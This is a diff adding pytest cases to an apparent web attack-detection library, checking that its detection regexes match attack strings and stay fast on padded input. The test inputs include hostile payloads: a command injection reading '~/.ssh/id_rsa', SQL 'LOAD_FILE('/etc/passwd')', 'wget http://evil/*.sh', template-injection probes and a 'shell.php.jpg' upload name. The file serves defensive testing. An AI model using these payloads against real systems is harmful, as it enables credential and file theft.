@@ -1,5 +1,7 @@
+import itertools
 import multiprocessing as mp
 import re
+import statistics
 import time
 from collections.abc import Callable
 
@@ -7,9 +9,24 @@ import pytest
 
 from guard_core.detection_engine.compiler import PatternCompiler
 from guard_core.handlers.suspatterns_handler import (
+    _CMD_INJECTION_DOLLAR_SUBSTITUTION_RE,
     _DEFAULT_MAX_SCAN_LENGTH,
+    _FILE_UPLOAD_DOUBLE_EXTENSION_RE,
+    _GLOB_WILDCARD_ATOM_RE,
+    _PATTERN_SCAN_WINDOW_MATCHERS,
+    _SQLI_LOAD_FILE_RE,
+    _TEMPLATE_CURLY_CALL_RE,
+    _TEMPLATE_CURLY_KEYWORD_RE,
+    _TEMPLATE_DOLLAR_BRACE_CALL_RE,
     _WINDOWED_PATTERN_FINDERS,
     SusPatternsManager,
+    _cmd_injection_dollar_scan_matches,
+    _file_upload_double_extension_scan_matches,
+    _glob_wildcard_scan_matches,
+    _load_file_scan_matches,
+    _template_curly_call_scan_matches,
+    _template_curly_keyword_scan_matches,
+    _template_dollar_brace_scan_matches,
 )
 
 IM = re.IGNORECASE | re.MULTILINE
@@ -17,10 +34,15 @@ IM = re.IGNORECASE | re.MULTILINE
 
 def _child(pat: str, texts: list[str], q: "mp.Queue[list[float]]") -> None:
     compiled = re.compile(pat, IM)
+    matcher = _SCAN_WINDOW_MATCHER_NAME_BY_PATTERN.get(pat)
+    matcher_fn = _SCAN_WINDOW_MATCHERS[matcher] if matcher is not None else None
     times = []
     for text in texts:
         t0 = time.time()
-        compiled.search(text)
+        if matcher_fn is not None:
+            matcher_fn(text, compiled)
+        else:
+            compiled.search(text)
         times.append(time.time() - t0)
     q.put(times)
 
@@ -36,6 +58,72 @@ def _timed_batch(pat: str, texts: list[str], timeout: float) -> list[float] | No
         p.join()
         return None
     return q.get() if not q.empty() else [0.0] * len(texts)
+
+
+_SCAN_WINDOW_MATCHERS = {
+    "_load_file_scan_matches": _load_file_scan_matches,
+    "_cmd_injection_dollar_scan_matches": _cmd_injection_dollar_scan_matches,
+    "_file_upload_double_extension_scan_matches": (
+        _file_upload_double_extension_scan_matches
+    ),
+    "_template_curly_keyword_scan_matches": _template_curly_keyword_scan_matches,
+    "_template_dollar_brace_scan_matches": _template_dollar_brace_scan_matches,
+    "_template_curly_call_scan_matches": _template_curly_call_scan_matches,
+    "_glob_wildcard_scan_matches": _glob_wildcard_scan_matches,
+}
+
+_SCAN_WINDOW_MATCHER_NAME_BY_PATTERN = {
+    pattern_text: matcher_fn.__name__
+    for pattern_text, matcher_fn in _PATTERN_SCAN_WINDOW_MATCHERS.items()
+}
+
+
+def test_windowed_registries_share_no_pattern() -> None:
+    assert set(_WINDOWED_PATTERN_FINDERS).isdisjoint(_PATTERN_SCAN_WINDOW_MATCHERS)
+
+
+_SCAN_WINDOW_TIMING_RUNS = 5
+
+
+def _scan_window_child(
+    matcher_name: str,
+    pattern_text: str,
+    texts: list[str],
+    runs: int,
+    q: "mp.Queue[tuple[list[float], list[float]]]",
+) -> None:
+    compiled = re.compile(pattern_text, re.IGNORECASE)
+    matcher = _SCAN_WINDOW_MATCHERS[matcher_name]
+    mins = []
+    medians = []
+    for text in texts:
+        samples = []
+        for _ in range(runs):
+            t0 = time.process_time()
+            matcher(text, compiled)
+            samples.append(time.process_time() - t0)
+        samples.sort()
+        mins.append(samples[0])
+        medians.append(statistics.median(samples))
+    q.put((mins, medians))
+
+
+def _timed_scan_window_batch(
+    matcher_name: str, pattern_text: str, texts: list[str], timeout: float
+) -> tuple[list[float], list[float]] | None:
+    ctx = mp.get_context("forkserver")
+    q: mp.Queue[tuple[list[float], list[float]]] = ctx.Queue()
+    p = ctx.Process(
+        target=_scan_window_child,
+        args=(matcher_name, pattern_text, texts, _SCAN_WINDOW_TIMING_RUNS, q),
+    )
+    p.start()
+    p.join(timeout)
+    if p.is_alive():
+        p.terminate()
+        p.join()
+        return None
+    return q.get() if not q.empty() else None
 
 
 def linear_search_time(
@@ -364,6 +452,395 @@ def test_sensitive_file_map_still_matches_multidot_filenames(path: str) -> None:
 def test_sensitive_file_source_still_matches_multidot_filenames(path: str) -> None:
     rx = _compiled("sensitive_file", "ts|tsx|jsx")
     assert rx.search(path), f"multi-dot source-file probe regressed: {path}"
+
+
+_SENSITIVE_FILE_CONFIG_OLD_PATTERN = (
+    r"\A[/\\]?(?:[\w.\-~%]+[/\\])*"
+    r"[\w-]*config[\w-]*\.(?:env|yml|yaml|json|toml|ini|xml|conf)"
+    r"(?:[/\\][\w.\-~%]*)*(?:\?\S*)?\s*\Z"
+)
+
+
+@pytest.mark.parametrize(
+    "path",
+    [
+        "config.yml",
+        "config.json",
+        "app-config.yaml",
+        "site_config.toml",
+        "my-config-old.ini",
+        "webconfig.xml",
+        "src-config-cache.yml",
+        "staging-config.env",
+        "docker-config.conf",
+        "config-log.yml",
+        "cache-config-cache.json",
+        "configconfig.yml",
+        "myconfigconfig-old.toml",
+        "/etc/app/config.yml",
+        "app/src/config-backup.json",
+        "gconfig.yml",
+        "configg.yml",
+        "configuration.yml",
+    ],
+)
+def test_sensitive_file_config_still_matches_real_filenames(path: str) -> None:
+    rx = _compiled("sensitive_file", "config")
+    assert rx.search(path), f"real config-file probe regressed: {path}"
+
+
+@pytest.mark.parametrize(
+    "path",
+    [
+        "settings.yml",
+        "database.json",
+        "readme.env",
+        "config.txt",
+    ],
+)
+def test_sensitive_file_config_does_not_match_unrelated_filenames(path: str) -> None:
+    rx = _compiled("sensitive_file", "config")
+    assert not rx.search(path), f"unrelated filename falsely flagged: {path}"
+
+
+def test_sensitive_file_config_resists_repeated_literal_padding() -> None:
+    rx = _compiled("sensitive_file", "config")
+    sizes = [16000, 32000, 64000]
+
+    def mk(n: int) -> str:
+        unit = "config"
+        return (unit * (n // len(unit) + 1))[:n]
+
+    _quadratic_resistant(rx.pattern, mk, sizes)
+
+
+def test_sensitive_file_config_rewrite_matches_original_language() -> None:
+    rx_new = _compiled("sensitive_file", "config")
+    rx_old = re.compile(_SENSITIVE_FILE_CONFIG_OLD_PATTERN, re.IGNORECASE)
+
+    corpus = [
+        "config.yml",
+        "config.json",
+        "app-config.yaml",
+        "site_config.toml",
+        "my-config-old.ini",
+        "webconfig.xml",
+        "src-config-cache.yml",
+        "staging-config.env",
+        "docker-config.conf",
+        "config-log.yml",
+        "cache-config-cache.json",
+        "configconfig.yml",
+        "myconfigconfig-old.toml",
+        "/etc/app/config.yml",
+        "app/src/config-backup.json",
+        "gconfig.yml",
+        "configg.yml",
+        "configuration.yml",
+        "settings.yml",
+        "database.json",
+        "readme.env",
+        "config.txt",
+        "config",
+        "config.yml.bak",
+        "a-config-b-config-c.yml",
+        "CONFIG.YML",
+        "Config.Env",
+    ]
+    letters = "cognifx-"
+    for prefix_len in range(3):
+        for suffix_len in range(3):
+            for prefix_chars in itertools.product(letters, repeat=prefix_len):
+                for suffix_chars in itertools.product(letters, repeat=suffix_len):
+                    prefix = "".join(prefix_chars)
+                    suffix = "".join(suffix_chars)
+                    corpus.append(f"{prefix}config{suffix}.yml")
+
+    mismatches = []
+    for text in corpus:
+        old_result = bool(rx_old.search(text))
+        new_result = bool(rx_new.search(text))
+        if old_result != new_result:
+            mismatches.append((text, old_result, new_result))
+
+    assert not mismatches, "rewrite diverged from original on:\n" + "\n".join(
+        f"  {t!r}: old={o} new={n}" for t, o, n in mismatches[:20]
+    )
+
+
+def test_ldap_conjunction_wildcard_matches_attack_shapes() -> None:
+    rx = _compiled("ldap", "[|&]")
+    assert rx.search("(|(cn=*)")
+    assert rx.search("(&(uid=*)")
+
+
+@pytest.mark.parametrize(
+    "attr",
+    [
+        "cn",
+        "uid",
+        "mail",
+        "objectClass",
+        "sAMAccountName",
+        "member-Of",
+        "distinguishedName",
+        "employee-ID-2",
+    ],
+)
+def test_ldap_conjunction_wildcard_matches_rfc4512_attribute_names(attr: str) -> None:
+    rx = _compiled("ldap", "[|&]")
+    assert rx.search(f"(|({attr}=*)"), f"real LDAP attribute regressed: {attr}"
+    assert rx.search(f"(&({attr}=*)"), f"real LDAP attribute regressed: {attr}"
+
+
+def test_ldap_conjunction_wildcard_resists_unclosed_paren_padding() -> None:
+    rx = _compiled("ldap", "[|&]")
+    sizes = [16000, 32000, 64000]
+
+    def mk(n: int) -> str:
+        unit = "(|("
+        return (unit * (n // len(unit) + 1))[:n]
+
+    _quadratic_resistant(rx.pattern, mk, sizes)
+
+
+def test_sqli_load_file_still_matches_nested_mysql_call() -> None:
+    compiled = re.compile(_SQLI_LOAD_FILE_RE, re.IGNORECASE)
+    matches = _load_file_scan_matches(
+        "LOAD_FILE(CONCAT(0x2f6574632f706173737764))", compiled
+    )
+    assert len(matches) == 1
+    assert matches[0].group() == "LOAD_FILE(CONCAT(0x2f6574632f706173737764)"
+
+
+def test_sqli_load_file_still_matches_real_attack() -> None:
+    compiled = re.compile(_SQLI_LOAD_FILE_RE, re.IGNORECASE)
+    assert _load_file_scan_matches("LOAD_FILE('/etc/passwd')", compiled)
+    assert _load_file_scan_matches("load_file(0x2f6574632f706173737764)", compiled)
+
+
+def _assert_scan_window_linear_and_fast(
+    result: tuple[list[float], list[float]] | None, label: str
+) -> None:
+    assert result is not None, f"{label} scan window did not finish in time"
+    mins, medians = result
+    assert mins[-1] < 0.05, (
+        f"{label} exceeded 50ms (min of {_SCAN_WINDOW_TIMING_RUNS} CPU-time runs) "
+        f"at the largest size: mins={mins}"
+    )
+    ratio = mins[-1] / mins[0] if mins[0] > 0 else 0.0
+    assert ratio < 6.0, (
+        f"{label} grew {ratio:.1f}x over a 4x size increase (min-of-"
+        f"{_SCAN_WINDOW_TIMING_RUNS} CPU time): mins={mins} medians={medians}"
+    )
+
+
+def test_sqli_load_file_resists_repeated_literal_padding() -> None:
+    sizes = [65536, 131072, 262144]
+
+    def mk(n: int) -> str:
+        unit = "LOAD_FILE("
+        return (unit * (n // len(unit) + 1))[:n]
+
+    texts = [mk(n) for n in sizes]
+    result = _timed_scan_window_batch(
+        "_load_file_scan_matches", _SQLI_LOAD_FILE_RE, texts, timeout=4.0
+    )
+    _assert_scan_window_linear_and_fast(result, "sqli LOAD_FILE")
+
+
+def test_cmd_injection_dollar_still_matches_embedded_dollar_variable() -> None:
+    compiled = re.compile(_CMD_INJECTION_DOLLAR_SUBSTITUTION_RE, re.IGNORECASE)
+    matches = _cmd_injection_dollar_scan_matches(";$(cat $HOME/.ssh/id_rsa)", compiled)
+    assert len(matches) == 1
+    assert matches[0].group() == ";$(cat $HOME/.ssh/id_rsa)"
+
+
+def test_cmd_injection_dollar_still_matches_brace_form() -> None:
+    compiled = re.compile(_CMD_INJECTION_DOLLAR_SUBSTITUTION_RE, re.IGNORECASE)
+    matches = _cmd_injection_dollar_scan_matches(";${HOME}", compiled)
+    assert len(matches) == 1
+    assert matches[0].group() == ";${HOME}"
+
+
+def test_cmd_injection_dollar_still_matches_nested_brace_inside_paren() -> None:
+    compiled = re.compile(_CMD_INJECTION_DOLLAR_SUBSTITUTION_RE, re.IGNORECASE)
+    matches = _cmd_injection_dollar_scan_matches(";$(echo ${HOME}/file)", compiled)
+    assert len(matches) == 1
+    assert matches[0].group() == ";$(echo ${HOME}/file)"
+
+
+def test_cmd_injection_dollar_resists_repeated_literal_padding() -> None:
+    sizes = [65536, 131072, 262144]
+
+    for unit in (";$(", ";${"):
+
+        def mk(n: int, unit: str = unit) -> str:
+            return (unit * (n // len(unit) + 1))[:n]
+
+        texts = [mk(n) for n in sizes]
+        result = _timed_scan_window_batch(
+            "_cmd_injection_dollar_scan_matches",
+            _CMD_INJECTION_DOLLAR_SUBSTITUTION_RE,
+            texts,
+            timeout=4.0,
+        )
+        _assert_scan_window_linear_and_fast(result, f"cmd_injection dollar {unit!r}")
+
+
+def test_file_upload_double_extension_still_matches_real_attacks() -> None:
+    compiled = re.compile(_FILE_UPLOAD_DOUBLE_EXTENSION_RE, re.IGNORECASE)
+    assert _file_upload_double_extension_scan_matches(
+        'filename="shell.php.jpg"', compiled
+    )
+    assert _file_upload_double_extension_scan_matches(
+        "filename='shell.php.jpg'", compiled
+    )
+    assert not _file_upload_double_extension_scan_matches(
+        'filename="invoice.pdf"', compiled
+    )
+    assert not _file_upload_double_extension_scan_matches(
+        'filename="report.php"', compiled
+    )
+
+
+def test_file_upload_double_extension_finds_attack_before_later_benign_field() -> None:
+    compiled = re.compile(_FILE_UPLOAD_DOUBLE_EXTENSION_RE, re.IGNORECASE)
+    matches = _file_upload_double_extension_scan_matches(
+        'filename="a.php.jpg" filename="b.pdf"', compiled
+    )
+    assert len(matches) == 1
+    assert matches[0].group() == 'filename="a.php.jpg"'
+
+
+def test_file_upload_double_extension_resists_unclosed_repeated_extension_padding() -> (
+    None
+):
+    sizes = [65536, 131072, 262144]
+
+    def mk(n: int) -> str:
+        prefix = 'filename="'
+        body = ".php" * ((n - len(prefix)) // 4 + 1)
+        return (prefix + body)[:n]
+
+    texts = [mk(n) for n in sizes]
+    result = _timed_scan_window_batch(
+        "_file_upload_double_extension_scan_matches",
+        _FILE_UPLOAD_DOUBLE_EXTENSION_RE,
+        texts,
+        timeout=4.0,
+    )
+    _assert_scan_window_linear_and_fast(result, "file_upload double-extension")
+
+
+def test_template_curly_keyword_still_matches_real_attack() -> None:
+    compiled = re.compile(_TEMPLATE_CURLY_KEYWORD_RE, re.IGNORECASE)
+    assert _template_curly_keyword_scan_matches("{{ x;system }}", compiled)
+    assert not _template_curly_keyword_scan_matches("{{ name }}", compiled)
+
+
+def test_template_curly_keyword_detects_padding_past_old_256_cap() -> None:
+    compiled = re.compile(_TEMPLATE_CURLY_KEYWORD_RE, re.IGNORECASE)
+    padding = "b " * 130
+    text = "{{ " + padding + "system }}"
+    assert len(padding) > 256
+    assert _template_curly_keyword_scan_matches(text, compiled)
+
+
+def test_template_curly_keyword_resists_repeated_literal_padding() -> None:
+    sizes = [65536, 131072, 262144]
+
+    def mk(n: int) -> str:
+        prefix = "{{ "
+        return (prefix + "a" * n)[:n]
+
+    texts = [mk(n) for n in sizes]
+    result = _timed_scan_window_batch(
+        "_template_curly_keyword_scan_matches",
+        _TEMPLATE_CURLY_KEYWORD_RE,
+        texts,
+        timeout=4.0,
+    )
+    _assert_scan_window_linear_and_fast(result, "template curly keyword")
+
+
+def test_template_dollar_brace_still_matches_real_attack() -> None:
+    compiled = re.compile(_TEMPLATE_DOLLAR_BRACE_CALL_RE, re.IGNORECASE)
+    assert _template_dollar_brace_scan_matches("${7*7}", compiled)
+    assert _template_dollar_brace_scan_matches("${@java.lang.Runtime@}", compiled)
+    assert not _template_dollar_brace_scan_matches("${amount}", compiled)
+
+
+def test_template_dollar_brace_resists_repeated_literal_padding() -> None:
+    sizes = [65536, 131072, 262144]
+
+    def mk(n: int) -> str:
+        prefix = "${"
+        return (prefix + "a" * n)[:n]
+
+    texts = [mk(n) for n in sizes]
+    result = _timed_scan_window_batch(
+        "_template_dollar_brace_scan_matches",
+        _TEMPLATE_DOLLAR_BRACE_CALL_RE,
+        texts,
+        timeout=4.0,
+    )
+    _assert_scan_window_linear_and_fast(result, "template dollar-brace")
+
+
+def test_template_curly_call_still_matches_real_attack() -> None:
+    compiled = re.compile(_TEMPLATE_CURLY_CALL_RE, re.IGNORECASE)
+    assert _template_curly_call_scan_matches("{{7*7}}", compiled)
+    assert _template_curly_call_scan_matches("{{config.items()}}", compiled)
+    assert not _template_curly_call_scan_matches("{{name}}", compiled)
+
+
+def test_template_curly_call_resists_repeated_literal_padding() -> None:
+    sizes = [65536, 131072, 262144]
+
+    def mk(n: int) -> str:
+        prefix = "{{"
+        return (prefix + "a" * n)[:n]
+
+    texts = [mk(n) for n in sizes]
+    result = _timed_scan_window_batch(
+        "_template_curly_call_scan_matches",
+        _TEMPLATE_CURLY_CALL_RE,
+        texts,
+        timeout=4.0,
+    )
+    _assert_scan_window_linear_and_fast(result, "template curly call")
+
+
+def test_glob_wildcard_still_matches_real_attacks() -> None:
+    compiled = re.compile(_GLOB_WILDCARD_ATOM_RE, re.IGNORECASE)
+    matches = _glob_wildcard_scan_matches("rm -rf /tmp/*.log", compiled)
+    assert [m.group() for m in matches] == ["/tmp/*.log"]
+    matches = _glob_wildcard_scan_matches("wget http://evil/*.sh", compiled)
+    assert [m.group() for m in matches] == ["//evil/*.sh"]
+
+
+def test_glob_wildcard_does_not_match_plain_text() -> None:
+    compiled = re.compile(_GLOB_WILDCARD_ATOM_RE, re.IGNORECASE)
+    assert not _glob_wildcard_scan_matches("ls file.txt", compiled)
+    assert not _glob_wildcard_scan_matches("the quick brown fox", compiled)
+
+
+def test_glob_wildcard_detects_run_past_old_100_char_cap() -> None:
+    compiled = re.compile(_GLOB_WILDCARD_ATOM_RE, re.IGNORECASE)
+    text = "a" * 150 + "?" + "b" * 150
+    matches = _glob_wildcard_scan_matches(text, compiled)
+    assert len(matches) == 1
+    assert matches[0].group() == text
+
+
+def test_glob_wildcard_resists_no_wildcard_adversarial_fill() -> None:
+    sizes = [65536, 131072, 262144]
+    texts = ["a" * n for n in sizes]
+    result = _timed_scan_window_batch(
+        "_glob_wildcard_scan_matches", _GLOB_WILDCARD_ATOM_RE, texts, timeout=4.0
+    )
+    _assert_scan_window_linear_and_fast(result, "cmd_injection glob wildcard")
 
 
 @pytest.mark.parametrize(
